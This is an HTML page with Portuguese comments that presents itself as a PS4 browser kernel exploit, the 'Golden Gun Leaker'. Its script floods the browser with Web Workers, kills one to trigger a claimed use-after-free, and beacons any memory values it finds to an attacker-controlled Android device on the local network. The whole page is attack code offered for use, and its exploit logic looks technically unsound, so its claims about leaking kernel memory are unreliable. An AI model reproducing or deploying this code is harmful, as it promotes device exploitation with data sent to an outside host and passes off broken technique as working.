<!DOCTYPE html>
<html lang="pt-PT">
<head>
    <meta charset="UTF-8">
    <title>PS4 GOLDEN GUN (NET LEAKER)</title>
    <style>
        body { background: #000; color: #d4af37; font-family: monospace; text-align: center; font-size: 20px; }
        #status { border: 2px solid #d4af37; padding: 20px; margin-top: 50px; }
        .danger { color: #f00; animation: blink 0.1s infinite; }
        @keyframes blink { 0% {opacity:1} 50% {opacity:0} 100% {opacity:1} }
    </style>
</head>
<body>
    <h1>GOLDEN GUN LEAKER</h1>
    <div id="status">CONFIGURE O IP ABAIXO!</div>

    <script>
        // --- CONFIGURAÇÃO (SEU ANDROID) ---
        const ANDROID_IP = "192.168.1.3"; // <--- EDITE AQUI
        const PORT = "8000";

        // Parâmetros do Crash
        const TARGET_THREADS = 418;
        const STRUCT_SIZE = 128; // 512 bytes / 4
        
        // Padrão visual para debug (AAAA)
        const PATTERN = 0x41414141;

        let workers = [];
        const sharedBuffer = new SharedArrayBuffer(STRUCT_SIZE * 4);
        const sensor = new Uint32Array(sharedBuffer);

        // Worker 1: O "Reporter" (Transmissor de Rede)
        // Ele roda em loop infinito tentando enviar dados para o Android
        const reporterCode = `
            onmessage = function(e) {
                const ip = e.data.ip;
                const port = e.data.port;
                const buffer = new Uint32Array(e.data.buffer);
                
                // Pré-aquecer conexão (DNS/TCP Handshake)
                fetch("http://" + ip + ":" + port + "/WARMUP").catch(()=>{});

                // Loop insano de leitura
                setInterval(() => {
                    for(let i=0; i<buffer.length; i++) {
                        let val = buffer[i];
                        // Se o valor não for 0 e não for o nosso padrão (AAAA)
                        // Significa que o Kernel escreveu aqui!
                        if(val !== 0 && val !== 0x41414141) {
                            // Envia TUDO o que achar, sem esperar resposta
                            // "Fire and Forget"
                            const hex = val.toString(16);
                            const url = "http://" + ip + ":" + port + "/LEAK_OFF_" + i + "_VAL_" + hex;
                            
                            // Image Beacon é mais rápido que fetch em alguns casos de crash
                            new Image().src = url;
                        }
                    }
                }, 1); // Verifica a cada 1ms
            }
        `;

        // Worker 2: O "Killer" (Gatilho do UAF)
        const killerCode = "self.close();";

        function start() {
            if(ANDROID_IP.includes("XX")) {
                alert("EDITE O IP!");
                return;
            }

            // Limpa o sensor com o padrão
            sensor.fill(PATTERN);

            // Inicia o Reporter
            const reporterBlob = new Blob([reporterCode], {type: 'text/javascript'});
            const reporter = new Worker(URL.createObjectURL(reporterBlob));
            reporter.postMessage({ ip: ANDROID_IP, port: PORT, buffer: sharedBuffer });

            document.getElementById('status').innerText = "1. SUBINDO THREADS...";
            createThreads();
        }

        function createThreads() {
            const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
            const url = URL.createObjectURL(blob);

            let i = setInterval(() => {
                if (workers.length < TARGET_THREADS) {
                    workers.push(new Worker(url));
                    if(workers.length % 50 === 0) document.getElementById('status').innerText = `THREADS: ${workers.length}...`;
                } else {
                    clearInterval(i);
                    document.getElementById('status').innerText = "2. KAMIKAZE MODE!";
                    document.getElementById('status').className = "danger";
                    
                    setTimeout(triggerUAF, 500);
                }
            }, 30);
        }

        function triggerUAF() {
            // Mata a thread
            const killerBlob = new Blob([killerCode], {type:'text/javascript'});
            const killerUrl = URL.createObjectURL(killerBlob);
            const w = new Worker(killerUrl);
            w.terminate();

            // Tenta forçar o nosso buffer compartilhado para o lugar da thread
            // A ideia é: Thread morre -> Memória fica livre -> SharedBuffer ocupa o lugar -> Kernel escreve no SharedBuffer -> Reporter envia para o Android
            try {
                // Truque de realocação rápida
                const hole = new Uint32Array(sharedBuffer);
            } catch(e) {}
        }

        setTimeout(start, 2000);

    </script>
</body>
</html>
